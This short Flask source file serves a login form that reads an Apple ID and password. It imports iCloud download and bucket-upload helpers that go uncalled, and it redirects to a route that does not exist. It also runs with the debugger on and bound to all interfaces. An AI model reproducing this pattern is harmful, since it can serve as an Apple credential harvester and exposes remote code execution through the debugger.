from flask import Flask, render_template, request, redirect, url_for, session
from icloud.ipull import down_screen
from icloud.upload_imgs import upload_files_to_bucket


app = Flask(__name__)

@app.route('/')
def login():
   return render_template('index.html')

@app.route('/login', methods=['POST'])
def do_login():
   apple_id = request.form['apple_id']
   password = request.form['password']


   return redirect(url_for('protected'))

if __name__ == "__main__":
   app.run(debug=True, host='0.0.0.0')